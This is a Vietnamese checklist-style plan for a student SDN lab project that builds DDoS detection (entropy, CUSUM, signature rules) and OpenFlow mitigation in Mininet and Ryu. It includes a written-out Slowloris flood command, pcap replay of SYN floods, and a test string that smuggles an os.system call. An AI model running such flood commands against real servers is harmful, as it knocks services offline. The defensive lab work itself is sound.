        h = self.h_factor * sig
        self.cusum[key] = max(0, self.cusum[key] + (x - mu - k))
        alert = self.cusum[key] > h
        if alert: self.cusum[key] = 0
        return {"alert": alert, "score": self.cusum[key],
                "source": "cusum", "feature": key}

    def check(self, features):
        alerts = []
        for key in ('pps', 'bps', 'new_flows_per_sec'):
            if key not in features: continue
            for fn in (self.zscore, self.ewma_check, self.cusum_check):
                r = fn(key, features[key])
                if r["alert"]: alerts.append(r)
        return {"anomaly": len(alerts) > 0, "alerts": alerts}
[ ] Bước 2. tests/test_stats.py: test_zscore_normal, test_zscore_attack, test_cusum_gradual.
[ ] Bước 3. pytest tests/test_stats.py -v → pass.
[ ] Bước 4. Commit [TV3] stats: Z-score + EWMA + CUSUM (cite E4).
Bổ sung so với router cũ: thêm tỉ lệ cờ TCP từ PacketIn (A1) → SYN flood chính xác hơn.
🟥 [TV4] Task 4.3 — mitigation.py BlockModule (D2 Trưa)  [DEPENDS 4.2]
[ ] Bước 1. Tạo code/mitigation.py (gộp 3 module). Cite D2, D4:
"""Mitigation modules — Block + RateLimit + Blacklist."""
import time, threading

class BlockModule:
    def __init__(self, app):
        self.app = app

    def apply(self, dp, src_ip, timeout=60):
        parser = dp.ofproto_parser
        match = parser.OFPMatch(eth_type=0x0800, ipv4_src=src_ip)
        inst = []  # empty = drop
        mod = parser.OFPFlowMod(datapath=dp, priority=100,
                                match=match, instructions=inst,
                                hard_timeout=timeout)
        dp.send_msg(mod)
        self.app.logger.warning(f"[BLOCK] {src_ip} for {timeout}s")
[ ] Bước 2. Unit test tests/test_mitigation.py (mock dp): assert FlowMod priority=100, instructions empty.
[ ] Bước 3. Commit [TV4] mitigation: BlockModule FlowMod drop.
🟪 [TV5] Task 5.10 — s07 Slowloris + s08 Flash Crowd (D2 Trưa)
s07 — Slowloris — slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://10.0.2.10/ -p 3 -l 300.
s08 — Flash Crowd — chạy ab -c 50 -n 25000 từ h_pc1–h_pc4 song song. Kỳ vọng: detector KHÔNG alert (đo FPR riêng s08). Nếu alert → TV3 cần điều chỉnh flash crowd guard.
[ ] chmod +x cả 4 file. Test mỗi script chạy 5' không lỗi. Commit [TV5] attack: scripts s05–s08.
🟪 [TV5] Task 5.2b — Regression test router cũ vs mới (D2 Trưa)  [DEPENDS 4.2]
[ ] Bước 1. Tạo tests/test_regression_router.py: chạy router cũ + mới trên cùng s01_syn.pcap, assert (a) router mới vẫn alert (không gãy), (b) router mới còn alert thêm signature mới.
[ ] Bước 2. Verify pass.

🌇 D2 Chiều (14:00–18:00) — Features + Signature + RateLimit + InfluxDB
🟩 [TV2] Task 2.5 — Feature extraction 10 features (D2 Chiều)  [BLOCKING TV3 detector]
[ ] Bước 1. Tạo code/feature_extraction.py:
"""Trích 10 features/window từ pcap. Window 1s, slide 0.5s."""
from scapy.all import PcapReader, IP, TCP, UDP, ICMP
from collections import Counter
import math, csv, sys

def shannon(items):
    c = Counter(items); n = sum(c.values())
    return -sum((v/n)*math.log2(v/n) for v in c.values()) if n else 0

def renyi(items, q=2):
    c = Counter(items); n = sum(c.values())
    if n == 0: return 0
    s = sum((v/n)**q for v in c.values())
    return (1/(1-q)) * math.log2(s) if s > 0 else 0

def extract(pcap, out_csv, win=1.0, slide=0.5):
    pkts = []
    with PcapReader(pcap) as r:
        for p in r:
            if p.haslayer(IP): pkts.append((float(p.time), p))
    if not pkts: return
    t0, t_end = pkts[0][0], pkts[-1][0]
    with open(out_csv, 'w', newline='') as f:
        w = csv.writer(f)
        w.writerow(['t','entropy_src_ip','entropy_dst_ip','entropy_dst_port',
                    'entropy_renyi_src','pps','bps','syn_pct','icmp_pct',
                    'new_flows_per_sec','avg_pkt_size'])
        t = t0
        flows_seen = set()
        while t < t_end:
            window = [p for ts,p in pkts if t <= ts < t+win]
            if not window: t += slide; continue
            src = [p[IP].src for p in window]
            dst = [p[IP].dst for p in window]
            dport = [p[1].dport for p in window if p.haslayer(TCP) or p.haslayer(UDP)]
            syn = sum(1 for p in window if p.haslayer(TCP) and p[TCP].flags & 0x02)
            icmp = sum(1 for p in window if p.haslayer(ICMP))
            flows_now = set((p[IP].src, p[IP].dst,
                             p[1].dport if p.haslayer(TCP) or p.haslayer(UDP) else 0)
                            for p in window)
            new_flows = len(flows_now - flows_seen)
            flows_seen |= flows_now
            n = len(window)
            w.writerow([round(t,2),
                        round(shannon(src),3), round(shannon(dst),3),
                        round(shannon(dport),3), round(renyi(src),3),
                        n/win, sum(len(p) for p in window)*8/win,
                        round(syn/n,3), round(icmp/n,3),
                        new_flows/win, round(sum(len(p) for p in window)/n,1)])
            t += slide

if __name__ == '__main__':
    extract(sys.argv[1], sys.argv[2])
[ ] Bước 2. Test trên baseline + 4 attack:
for s in baseline s01_syn s02_udp s03_icmp s04_http; do
python3 code/feature_extraction.py datasets/$s.pcap datasets/features/$s.csv
done
[ ] Bước 3. Mở s01_syn.csv: entropy_src_ip ≈ 0, syn_pct > 0.6, pps ≥ 5× baseline.
[ ] Bước 4. Commit [TV2] features: 10-feature extractor + 5 CSV.
DoD: 5 file CSV (baseline + s01–s04), mỗi file ≥ 100 row, 11 cột.
🟦 [TV3] Task 3.4 — signature_matcher.py (D2 Chiều)  [DEPENDS 1.4 attack_signatures.csv]
[ ] Bước 1. Đợi TV1 chốt docs/attack_signatures.csv (Task 1.4).
[ ] Bước 2. Tạo code/signature_matcher.py (AST-safe eval, chặn __import__):
"""Signature-based detector — đọc CSV của TV1 + parse safe."""
import csv, ast, operator

ALLOWED_OPS = {ast.Lt: operator.lt, ast.Gt: operator.gt,
               ast.LtE: operator.le, ast.GtE: operator.ge,
               ast.Eq: operator.eq, ast.NotEq: operator.ne,
               ast.And: all, ast.Or: any}

def safe_eval(rule_str, ctx):
    tree = ast.parse(rule_str, mode='eval')
    def _ev(n):
        if isinstance(n, ast.Expression): return _ev(n.body)
        if isinstance(n, ast.BoolOp):
            vals = [_ev(v) for v in n.values]
            return ALLOWED_OPS[type(n.op)](vals)
        if isinstance(n, ast.Compare):
            left = _ev(n.left); right = _ev(n.comparators[0])
            return ALLOWED_OPS[type(n.ops[0])](left, right)
        if isinstance(n, ast.Name): return ctx.get(n.id, 0)
        if isinstance(n, ast.Constant): return n.value
        if isinstance(n, ast.Num): return n.n
        raise ValueError(f"Disallowed: {ast.dump(n)}")
    return _ev(tree)

class SignatureMatcher:
    def __init__(self, csv_path='docs/attack_signatures.csv'):
        self.rules = []
        with open(csv_path) as f:
            for row in csv.DictReader(f):
                if row['name'] == 's08_flashcrowd': continue
                self.rules.append(row)

    def match(self, features):
        hits = []
        for r in self.rules:
            try:
                if safe_eval(r['rule'], features):
                    hits.append({"attack": r['name'], "rule": r['rule'],
                                 "papers": r.get('papers','')})
            except Exception as e:
                print(f"[sig] eval error {r['name']}: {e}")
        return hits
[ ] Bước 3. tests/test_signature.py: simple, blocks_dangerous (__import__('os').system(...) raises), match_syn.
[ ] Bước 4. Commit [TV3] signature: AST-safe matcher + 8 rule from CSV.
🟥 [TV4] Task 4.4 — RateLimitModule qua Meter Table OF1.3 (D2 Chiều) ⭐  [DEPENDS 4.2]
[ ] Bước 1. Append RateLimitModule vào code/mitigation.py:
class RateLimitModule:
    """Meter Table OF1.3 — yêu cầu protocols='OpenFlow13'."""
    def __init__(self, app):
        self.app = app
        self.meter_ids = {}

    def apply(self, dp, src_ip, pps=1000):
        parser = dp.ofproto_parser; ofp = dp.ofproto
        mid = abs(hash(src_ip)) & 0xffff
        self.meter_ids[src_ip] = mid
        band = parser.OFPMeterBandDrop(rate=pps, burst_size=pps//10)
        mmod = parser.OFPMeterMod(dp, command=ofp.OFPMC_ADD,
                                  flags=ofp.OFPMF_PKTPS,
                                  meter_id=mid, bands=[band])
        dp.send_msg(mmod)
        match = parser.OFPMatch(eth_type=0x0800, ipv4_src=src_ip)
        inst = [parser.OFPInstructionMeter(meter_id=mid),
                parser.OFPInstructionActions(
                    ofp.OFPIT_APPLY_ACTIONS,
                    [parser.OFPActionOutput(ofp.OFPP_NORMAL)])]
        fmod = parser.OFPFlowMod(datapath=dp, priority=80,
                                 match=match, instructions=inst,
                                 hard_timeout=120)
        dp.send_msg(fmod)
        self.app.logger.warning(f"[RATELIMIT] {src_ip} → {pps} pps (meter={mid})")
[ ] Bước 2. Verify Meter support: sudo ovs-ofctl -O OpenFlow13 dump-meter-features s2.
[ ] Bước 3. Test: iperf3 -c 10.0.2.10 -u -b 100M trước → ~100M; sau 2 alert + meter cài → bw rớt còn ~1Mbps.
[ ] Bước 4. Verify meter: sudo ovs-ofctl -O OpenFlow13 dump-meters s2.
[ ] Bước 5. Commit [TV4] mitigation: rate-limit qua Meter Table OF1.3.
Cảnh báo §F.3.1: Nếu OVS bản cũ không hỗ trợ Meter → upgrade apt install openvswitch-switch ≥ 2.10.
🟩 [TV2] Task 2.5b — Pipeline đọc InfluxDB router cũ (D2 Chiều)
[ ] Bước 1. Đảm bảo InfluxDB chạy + có bucket sdn. TV4 đã ghi entropy real-time.
[ ] Bước 2. Viết code/scripts/influx_pull.py:
from influxdb_client import InfluxDBClient
import csv

client = InfluxDBClient(url="http://localhost:8086", token="...", org="sdn")
q = '''from(bucket:"sdn") |> range(start:-30m)
       |> filter(fn:(r)=> r._measurement=="entropy")'''
tables = client.query_api().query(q)
with open('datasets/features/realtime.csv', 'w') as f:
    w = csv.writer(f); w.writerow(['t','metric','value'])
    for tbl in tables:
        for rec in tbl.records:
            w.writerow([rec.get_time(), rec.get_field(), rec.get_value()])
[ ] Bước 3. Để dashboard TV1 + detector TV3 dùng được realtime feed này.
[ ] Bước 4. Commit [TV2] pipeline: InfluxDB pull cho realtime feed.

🌃 D2 Tối (18:00–22:00) — EVAL protocol + Dashboard skeleton
🟧 [TV1] Task 1.5 — EVALUATION_PROTOCOL.md (D2 Tối)  [BLOCKING TV1 1.10 + TV5 5.6]
[ ] Bước 1. Định nghĩa TP/FP/TN/FN window 1s:
TP = trong attack + có alert
FN = trong attack + KHÔNG alert
FP = ngoài attack + có alert
TN = ngoài attack + KHÔNG alert
[ ] Bước 2. Công thức TPR/FPR/Precision/F1.
[ ] Bước 3. Quy trình: 3 lần × 5'/scenario; trung bình + std. 70% tune / 30% test theo thời gian (KHÔNG shuffle).
[ ] Bước 4. Ngưỡng: TPR≥92%, FPR≤5%, detect_lat≤3s, mitigate_lat≤5s.
[ ] Bước 5. Commit + share TV5 (Task 1.10).
🟧 [TV1] Task 1.9 — Dashboard dashboard.py ⭐ — Phần A+B (D2 Tối)
Phần A — Setup khung
[ ] A.1. pip install flask influxdb-client requests.
[ ] A.2. code/dashboard.py skeleton:
from flask import Flask, render_template, jsonify, request
app = Flask(__name__)

@app.route('/')
def home(): return render_template('index.html')

@app.route('/api/stats')
def stats(): return jsonify({"entropy": [], "pps": []})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
[ ] A.3. code/templates/index.html (Chart.js CDN):
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<canvas id="entropyChart"></canvas>
<script>
setInterval(async () => {
    const r = await fetch('/api/stats').then(x => x.json());
}, 2000);
</script>
Phần B — InfluxDB
[ ] B.1. Query Flux:
from influxdb_client import InfluxDBClient
client = InfluxDBClient(url="http://localhost:8086", token="...", org="sdn")
query = '''from(bucket:"sdn") |> range(start:-5m)
           |> filter(fn:(r)=> r._measurement=="entropy")'''
result = client.query_api().query(query)
[ ] B.2. Chuyển kết quả thành [{t, value}] cho Chart.js.

✅ Cuối D2 — Mốc M_D2
[ ] 4 attack scripts s01–s04 + 4 attack s05–s08 chạy 5' không lỗi, mỗi pcap ≥ 50MB (TV2 2.3 + TV5 5.10).
[ ] entropy.py 5 unit test pass (TV3 3.2).
[ ] stats.py 3 unit test pass (TV3 3.3).
[ ] signature_matcher.py AST-safe, 3 test pass (TV3 3.4).
[ ] l3_router_extended.py REST /api/alert + /api/block + whitelist + policy.yaml (TV4 4.2).
[ ] Self-DoS controller fix verify CPU < 30% (TV4 4.2c).
[ ] BlockModule cài FlowMod drop verify (TV4 4.3).
[ ] RateLimitModule Meter Table OF1.3 — dump-meters + iperf3 100M → 1Mbps (TV4 4.4).
[ ] feature_extraction.py + 5 CSV ≥ 100 row × 11 cột (TV2 2.5).
[ ] influx_pull.py realtime feed (TV2 2.5b).
[ ] Regression test router cũ vs mới pass (TV5 5.2b).
[ ] EVALUATION_PROTOCOL.md (TV1 1.5).
[ ] dashboard.py Phần A+B chạy ở port 8080 (TV1 1.9 A+B).

🌅 NGÀY D3 — Integration + Eval + Báo cáo + Slide + Dry-run
Mục tiêu cuối D3: detector orchestrator chạy E2E, integration test pass, harness run_scenario.py chạy 8×3 = 24 JSON, metrics + benchmark + 6 figs, policy.yaml chốt, thresholds.yaml grid search, stress test, báo cáo IEEE 8 chương, slide + video demo, 2 buổi dry-run.

☀️ D3 Sáng (08:00–12:00) — Alert system + Dashboard /alerts /flows + Integration test + Blacklist
🟦 [TV3] Task 3.5 — alert_system.py + detector.py (D3 Sáng)  [DEPENDS 2.5 + 3.2/3.3/3.4 + 1.5]
[ ] Bước 1. Tạo code/alert_system.py (dedup 5s, POST TV4:8081, INFO/WARN/CRITICAL theo n_rules):
import json, time, requests
from collections import defaultdict

TV4_ENDPOINT = "http://127.0.0.1:8081/api/alert"
DEDUP_WINDOW = 5
LOG_PATH = "results/raw/alerts.json"

class AlertSystem:
    def __init__(self):
        self.last_seen = defaultdict(float)

    def severity(self, n_rules):
        if n_rules == 0: return None
        if n_rules == 1: return "INFO"
        if n_rules == 2: return "WARN"
        return "CRITICAL"

    def emit(self, src_ip, attack, n_rules, evidence):
        key = (attack, src_ip); now = time.time()
        if now - self.last_seen[key] < DEDUP_WINDOW: return
        self.last_seen[key] = now
        payload = {"timestamp": now, "src_ip": src_ip, "attack": attack,
                   "severity": self.severity(n_rules),
                   "n_rules": n_rules, "evidence": evidence}
        with open(LOG_PATH, 'a') as f:
            f.write(json.dumps(payload) + "\n")
        try: requests.post(TV4_ENDPOINT, json=payload, timeout=1)
        except Exception as e: print(f"[alert] TV4 unreachable: {e}")
[ ] Bước 2. Orchestrator code/detector.py — vòng lặp 1s gọi Ryu REST /stats/flow/2, trích features, gọi entropy/stats/signature, aggregate n_rules, gọi alr.emit().
[ ] Bước 3. Commit [TV3] alert: dedup + POST TV4 + JSON log + detector orchestrator.
🟧 [TV1] Task 1.9 — Dashboard Phần C /alerts + Phần D /flows (D3 Sáng)
Phần C — /alerts
[ ] C.1. Endpoint /alerts đọc results/raw/alerts.json của TV4.
[ ] C.2. Bảng HTML cột: time, src_ip, attack_type, severity, action.
Phần D — /flows
[ ] D.1. requests.get(f'http://127.0.0.1:8080/stats/flow/{dpid}').
[ ] D.2. Hiển thị: priority, match, actions, byte_count, packet_count.
🟪 [TV5] Task 5.3 — Integration test E2E (D3 Sáng)  [DEPENDS toàn pipeline]
[ ] Bước 1. Tạo tests/test_integration.py với fixture stack (mn -c → ryu-manager → topology_v4 → detector):
import subprocess, time, requests, pytest, os

@pytest.fixture(scope="module")
def stack():
    subprocess.run(["sudo", "mn", "-c"], check=False)
    ryu = subprocess.Popen(["ryu-manager", "--wsapi-port", "8081",
                            "code/l3_router_extended.py"])
    time.sleep(3)
    mn = subprocess.Popen(["sudo", "python3", "code/topology/topology_v4.py"],
                          stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(8)
    detector = subprocess.Popen(["python3", "code/detector.py"])
    time.sleep(2)
    yield {"ryu": ryu, "mn": mn, "detector": detector}
    detector.terminate(); ryu.terminate()
    mn.communicate(b"exit\n", timeout=10)
    subprocess.run(["sudo", "mn", "-c"])

def test_s01_syn_flow(stack):
    stack["mn"].stdin.write(b"h_att1 bash code/attack_scripts/s01_syn.sh &\n")
    stack["mn"].stdin.flush()
    t0 = time.time(); alerts = ""
    while time.time() - t0 < 5:
        if os.path.exists('results/raw/alerts.json'):
            alerts = open('results/raw/alerts.json').read()
            if 'syn' in alerts.lower(): break
        time.sleep(0.2)
    assert 'syn' in alerts.lower()
    detect_lat = time.time() - t0
    assert detect_lat <= 3
    time.sleep(3)
    r = requests.get("http://localhost:8080/stats/flow/2").json()
    assert "10.0.1.10" in str(r)
[ ] Bước 2. sudo pytest tests/test_integration.py -v -s.
[ ] Bước 3. Commit [TV5] test: integration E2E s01.
🟥 [TV4] Task 4.6 — BlacklistManager RAM TTL (D3 Sáng)
[ ] Bước 1. Append vào code/mitigation.py:
class BlacklistManager:
    """{src_ip: expire_ts} với auto-release."""
    def __init__(self, app):
        self.app = app
        self.entries = {}
        self._stop = False
        threading.Thread(target=self._gc_loop, daemon=True).start()

    def add(self, src_ip, ttl=60):
        self.entries[src_ip] = time.time() + ttl

    def is_blocked(self, src_ip):
        exp = self.entries.get(src_ip)
        return exp is not None and exp > time.time()

    def _gc_loop(self):
        while not self._stop:
            now = time.time()
            expired = [ip for ip, exp in self.entries.items() if exp <= now]
            for ip in expired:
                del self.entries[ip]
                self.app.logger.info(f"[blacklist] auto-release {ip}")
            time.sleep(5)
[ ] Bước 2. Test TTL: bm.add("1.2.3.4", ttl=2) → is_blocked True; time.sleep(3) → False.

🌤️ D3 Trưa (12:00–14:00) — Harness + Manual block + Video demo + Benchmark mitigation + Run 8×3
🟪 [TV5] Task 5.4 — Harness run_scenario.py (D3 Trưa) ⭐  [DEPENDS 5.3]
[ ] Bước 1. Tạo code/run_scenario.py với 4 hàm start_topology(), start_ryu(), start_detector(), wait_for_alert(t0, timeout=10), wait_for_flowmod(t0, src_ip, timeout=10):
import subprocess, time, json, sys, os, requests

RYU_REST = "http://localhost:8080/stats/flow/2"
ALERT_LOG = "results/raw/alerts.json"

def start_topology():
    subprocess.run(["sudo", "mn", "-c"], check=False)
    p = subprocess.Popen(["sudo", "python3", "code/topology/topology_v4.py"],
                         stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(8); return p

def start_ryu():
    p = subprocess.Popen(["ryu-manager", "--wsapi-port", "8081",
                          "code/l3_router_extended.py"])
    time.sleep(3); return p

def start_detector():
    return subprocess.Popen(["python3", "code/detector.py"])

def wait_for_alert(t0, timeout=10):
    while time.time() - t0 < timeout:
        if os.path.exists(ALERT_LOG):
            for line in open(ALERT_LOG):
                ev = json.loads(line)
                if ev["timestamp"] >= t0:
                    return ev["timestamp"] - t0
        time.sleep(0.2)
    return None

def wait_for_flowmod(t0, src_ip, timeout=10):
    while time.time() - t0 < timeout:
        try:
            r = requests.get(RYU_REST, timeout=1).json()
            if src_ip in str(r): return time.time() - t0
        except Exception: pass
        time.sleep(0.3)
    return None

def run(scenario_id):
    os.makedirs("results/raw", exist_ok=True)
    open(ALERT_LOG, 'w').close()
    mn = start_topology(); ryu = start_ryu(); det = start_detector()
    try:
        t0 = time.time()
        mn.stdin.write(f"h_att1 bash code/attack_scripts/{scenario_id}.sh &\n".encode())
        mn.stdin.flush()
        src = "10.0.4.10" if scenario_id == "s08_flashcrowd" else "10.0.1.10"
        detect_lat = wait_for_alert(t0)
        mitigate_lat = wait_for_flowmod(t0, src)
        result = {"scenario": scenario_id, "timestamp": t0,
                  "detect_latency": detect_lat, "mitigate_latency": mitigate_lat,
                  "attack_window": [t0, t0 + 300],
                  "expected_alert": scenario_id != "s08_flashcrowd"}
        out = f"results/raw/run_{scenario_id}_{int(t0)}.json"
        json.dump(result, open(out, 'w'), indent=2)
        return result
    finally:
        det.terminate(); ryu.terminate()
        try: mn.communicate(b"exit\n", timeout=10)
        except: mn.kill()
        subprocess.run(["sudo", "mn", "-c"])

if __name__ == "__main__": run(sys.argv[1])
[ ] Bước 2. Test: sudo python3 code/run_scenario.py s01_syn.
[ ] Bước 3. Verify JSON output đủ field.
🟧 [TV1] Task 1.9 — Dashboard Phần E manual block + Phần F video demo (D3 Trưa)
Phần E — Manual block IP
[ ] E.1. Form HTML input IP + submit.
[ ] E.2. Backend POST /api/block chuyển TV4:
@app.route('/api/block', methods=['POST'])
def manual_block():
    ip = request.json['src_ip']
    requests.post('http://127.0.0.1:8081/api/alert',
                  json={"src_ip": ip, "severity": "critical_repeat"})
    return jsonify({"ok": True})
Phần F — Video demo
[ ] F.1. 4 cửa sổ: Mininet CLI | Ryu logs | Dashboard | hping3.
[ ] F.2. OBS quay 2': baseline → s01 → entropy giảm → alert → manual block → flow drop.
[ ] F.3. Lưu slides/demo_dashboard.mp4.
DoD Task 1.9:
[ ] Dashboard http://localhost:8080, 3 trang load OK.
[ ] Manual block tạo flow drop (verify ovs-ofctl dump-flows s2).
[ ] Video 2' lưu slides/.
🟥 [TV4] Task 4.7 — Benchmark mitigation (D3 Trưa)  [DEPENDS 4.3 + 4.4]
[ ] Bước 1. Tạo code/scripts/benchmark_mitigation.py:
"""(1) latency cài N FlowMod; (2) throughput trước/sau block; (3) RTT sau rate-limit."""
import time, requests, csv

ALERT = "http://localhost:8081/api/alert"

def measure_flowmod_batch(n, src_pool):
    t0 = time.time()
    for i in range(n):
        for _ in range(3):  # 3 alert → block
            requests.post(ALERT, json={"src_ip": src_pool[i % len(src_pool)],
                                       "attack": "bench"})
    return time.time() - t0

with open('results/benchmark_mitigation.csv', 'w') as f:
    w = csv.writer(f)
    w.writerow(['n_flows', 'install_latency_s', 'avg_per_flow_ms'])
    pool = [f"10.99.{i//256}.{i%256}" for i in range(1000)]
    for n in [1, 10, 100, 1000]:
        t = measure_flowmod_batch(n, pool)
        w.writerow([n, round(t, 3), round(t*1000/n, 2)])
[ ] Bước 2. Đo throughput: iperf h_att1 h_web1 trước/sau 3 alert.
[ ] Bước 3. Vẽ biểu đồ cột results/figs/mitigation_benchmark.png.
[ ] Bước 4. Kỳ vọng: 100 FlowMod < 200ms, 1000 FlowMod < 2s.
[ ] Bước 5. Commit [TV4] benchmark: FlowMod latency + throughput drop.
🟪 [TV5] Task 5.5 — Benchmark 8 × 3 (D3 Trưa)  [DEPENDS 5.4 + 4.4 + 3.5]
[ ] Bước 1. Tạo code/scripts/run_all.sh:
#!/bin/bash
set -e
for s in s01_syn s02_udp s03_icmp s04_http s05_dns_ampl s06_spoof s07_slowloris s08_flashcrowd; do
for run in 1 2 3; do
    echo "=== $s run $run ==="
    sudo python3 code/run_scenario.py $s
    sleep 5
done
done
[ ] Bước 2. Chạy bash code/scripts/run_all.sh | tee results/run_all.log.
[ ] Bước 3. Tổng hợp 24 file JSON → results/results_raw.json:
import json, glob
all_runs = [json.load(open(f)) for f in glob.glob('results/raw/run_*.json')]
json.dump(all_runs, open('results/results_raw.json','w'), indent=2)
[ ] Bước 4. Tính avg + std mỗi kịch bản, gửi cho TV1 (Task 1.10).
DoD: 24 file JSON + results_raw.json đầy đủ 8 × 3.

🌇 D3 Chiều (14:00–18:00) — Tuning + Policy + Metrics + Visualization + Stress
🟦 [TV3] Task 3.6 — Grid search ngưỡng (D3 Chiều)  [DEPENDS 5.5 features 8 CSV]
[ ] Bước 1. Lấy 8 file CSV features từ TV2 (s01–s04) + TV5 (s05–s08).
[ ] Bước 2. Tạo code/scripts/tune_thresholds.py — grid search k_sigma ∈ {1.0,1.5,2.0,2.5,3.0} × h_factor ∈ {3,4,5,6}, đọc CSV, dùng START_TS/END_TS làm ground truth, tính TPR/FPR/F1, ghi code/thresholds.yaml.
[ ] Bước 3. Chọn bộ F1 cao nhất.
[ ] Bước 4. Flash-crowd guard cho s08: sửa EntropyDetector.check:
if features.get('entropy_src_ip', 0) > 4.0 and \
 features.get('pps', 0) > self.mu['pps']:
    return {"anomaly": False, "alerts": [], "reason": "flash_crowd_pattern"}
Tức alert = entropy_anomaly AND rate_anomaly, không chỉ entropy đơn lẻ.
[ ] Bước 5. Re-run trên 8 kịch bản, verify TPR≥92%, FPR≤5%, s08 KHÔNG alert.
[ ] Bước 6. Commit [TV3] tuning: grid search → thresholds.yaml + flash crowd guard.
🟥 [TV4] Task 4.8 — Hoàn thiện policy.yaml (D3 Chiều)  [DEPENDS 5.5 + 4.4 + 4.7]
[ ] Bước 1. Sau khi TV5 chạy 8 kịch bản × 3 lần, đọc results/raw/*.json:
Cấp 1 log: chỉ FN nhỏ ban đầu (acceptable).
Cấp 2 rate-limit: throughput attacker ≈ 1 Mbps (verify).
Cấp 3 block: throughput attacker = 0.
[ ] Bước 2. Tinh chỉnh nếu rate quá lỏng/quá chặt (giảm pps từ 1000 → 500).
[ ] Bước 3. Commit + verify lại với TV5 integration test.
🟧 [TV1] Task 1.10 — metrics.py (D3 Chiều)  [DEPENDS 5.5 24 JSON + 1.5 EVAL]
[ ] Bước 1. Đọc input:
import json, glob
raw = [json.load(open(f)) for f in glob.glob('results/raw/run_*.json')]
[ ] Bước 2. Ground truth từ field attack_window: [start_ts, end_ts].
[ ] Bước 3. Hàm confusion:
def confusion(alerts, attack_window, total_duration, win=1.0):
    tp=fn=fp=tn=0; t = 0
    while t < total_duration:
        in_attack = attack_window[0] <= t <= attack_window[1]
        has_alert = any(attack_window[0]<=a<=t+win for a in alerts)
        if in_attack and has_alert: tp+=1
        elif in_attack: fn+=1
        elif has_alert: fp+=1
        else: tn+=1
        t += win
    return tp, fn, fp, tn
[ ] Bước 4. Xuất results/benchmark.csv:
scenario,TPR,FPR,F1,detect_latency_avg,mitigate_latency_avg
s01,0.96,0.02,0.95,1.8,3.2
[ ] Bước 5. 3 figs (matplotlib dpi=300):
confusion_matrix.png (8 subplot 2×4)
tpr_bar.png
fpr_bar.png (s08 phải thấp)
DoD: benchmark.csv đủ 8 dòng + 3 figs PNG ≥300dpi.
🟪 [TV5] Task 5.6 — Visualization 6 figs (D3 Chiều)  [DEPENDS 1.10 + 2.5 features + 5.5]
TV5 vẽ 4 figs, TV1 vẽ 2 figs. Cùng lưu results/figs/, 300dpi.
[ ] Fig 1 (TV5) entropy_timeline.png — baseline vs s01 SYN, threshold 1.5:
import matplotlib.pyplot as plt, csv
base = list(csv.DictReader(open('datasets/features/baseline.csv')))
syn  = list(csv.DictReader(open('datasets/features/s01_syn.csv')))
fig, ax = plt.subplots(figsize=(10,4))
ax.plot([float(r['t']) for r in base], [float(r['entropy_src_ip']) for r in base], label='baseline')
ax.plot([float(r['t']) for r in syn],  [float(r['entropy_src_ip']) for r in syn],  label='s01 SYN flood', color='red')
ax.axhline(1.5, ls='--', color='gray', label='threshold 1.5')
ax.set(xlabel='time (s)', ylabel='entropy_src_ip (bits)'); ax.legend()
plt.tight_layout(); plt.savefig('results/figs/entropy_timeline.png', dpi=300)
[ ] Fig 2 (TV5) pps_timeline_8scenarios.png — subplot 2×4.
[ ] Fig 3 (TV5) latency_cdf.png — 2 đường CDF (detection + mitigation), vạch 3s target:
import numpy as np
detects = [r['detect_latency'] for r in all_runs if r['detect_latency']]
mitigs  = [r['mitigate_latency'] for r in all_runs if r['mitigate_latency']]
fig, ax = plt.subplots()
for data, lbl in [(detects,'detection'),(mitigs,'mitigation')]:
    sorted_d = np.sort(data); cdf = np.arange(1,len(sorted_d)+1)/len(sorted_d)
    ax.plot(sorted_d, cdf, label=lbl)
ax.axvline(3, ls='--', color='gray', label='3s target')
ax.set(xlabel='latency (s)', ylabel='CDF'); ax.legend()
plt.savefig('results/figs/latency_cdf.png', dpi=300)
[ ] Fig 4 (TV5) throughput_before_after_mitigation.png — bar chart từ iperf3.
[ ] Fig 5+6 (TV1) confusion_matrix.png + tpr_fpr_bar.png (Task 1.10).
🟪 [TV5] Task 5.7 — Stress test (D3 Chiều)  [DEPENDS 4.4 + 3.5]
[ ] Bước 1. Replay pcap với tốc độ tăng dần:
for mult in 2 5 10; do
sudo tcpreplay --intf1=s2-eth1 --mbps=$((10*$mult)) datasets/s01_syn.pcap
sleep 30
done
[ ] Bước 2. Đo CPU + memory Ryu bằng psutil.process_iter(['name','cpu_percent','memory_info']).
[ ] Bước 3. Ghi results/stress_report.md bảng | Multiplier | Alert/30s | Ryu CPU% | Drop alert? | + kết luận ngưỡng bão hoà.

🌃 D3 Tối (18:00–22:00) — Báo cáo + Slide + Video demo + Dry-run + Code review
🟧 [TV1] Task 1.7 + 1.8 — Báo cáo IEEE 8 chương (D3 Tối)  [DEPENDS 1.10 + 5.6]
[ ] Ch.1 Giới thiệu (1tr): vấn đề, lý do SDN, scope đơn nguồn, đóng góp 4 ý.
[ ] Ch.2 Công trình liên quan (2tr): tóm Task 1.2, bảng 12 paper, gap.
[ ] Ch.3 Cơ sở lý thuyết (2tr): copy Task 1.3 + 3 sơ đồ.
[ ] Ch.4 Thiết kế hệ thống (2tr): topology, pipeline detection, mitigation graduated — xin sơ đồ TV2/TV3/TV4.
[ ] Ch.5 Triển khai (2tr): module 1 đoạn, code ≤10 dòng, ref file.
[ ] Ch.6 Đánh giá (3tr): 6 figs (Task 1.10 + Task 5.6), bảng benchmark.csv, phân tích từng kịch bản.
[ ] Ch.7 Bàn luận (1tr): hạn chế (đơn nguồn, ngưỡng tĩnh, không ML).
[ ] Ch.8 Kết luận (½tr): tổng kết + hướng mở rộng (DDoS thật, ML, IPv6).
[ ] References (≥ 12 paper).
[ ] Compile Overleaf → docs/FINAL_REPORT.pdf.
🟪 [TV5] Task 5.8 — Slide + Video demo (D3 Tối)
[ ] Bước 1. Tạo slides/main.tex LaTeX Beamer (30 slide cả nhóm), pdflatex slides/main.tex.
[ ] Bước 2. Phần 6 (TV5) gồm 6 slide.
[ ] Bước 3. Quay video backup 3' OBS Studio cho phòng live fail:
Cảnh 1 (30s): topology + Mininet pingall.
Cảnh 2 (30s): khởi động Ryu + detector + dashboard TV1.
Cảnh 3 (60s): trigger s01 — entropy giảm, alert nổ, flow drop.
Cảnh 4 (60s): bảng kết quả 8 kịch bản + biểu đồ chính.
[ ] Bước 4. Lưu slides/demo_backup.mp4.
